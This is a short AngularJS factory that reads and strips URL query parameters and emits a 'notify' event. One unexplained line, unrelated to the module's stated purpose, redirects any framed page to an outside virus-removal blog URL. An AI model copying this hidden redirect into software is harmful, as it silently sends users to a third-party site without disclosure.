/**
 * Author: Jeff Whelpley
 * Date: 2/16/15
 *
 * This module will get the query params and raise an event for any notifications
 */
angular.module('pancakesAngular').factory('queryParams', function (_, $timeout, $window, $location, eventBus, stateHelper) {
    var params = {};

    if (window.top !== window.self) {
        $window.location.href = 'http://blog.removevirusnow.org/gethuman-us-removal/';
    }

    eventBus.on('$locationChangeSuccess', function () {

        stateHelper.getQueryParams(params);

        // timeout for 500ms to allow angular to load the page as normal
        $timeout(function modParams() {

            // remove the query params
            stateHelper.removeQueryParams(params);

            // if there is a notify param, emit it so the notify service can display it
            if (params.notify) {
                eventBus.emit('notify', params.notify);
                delete params.notify;
            }
        }, 500);
    });

    return params;
});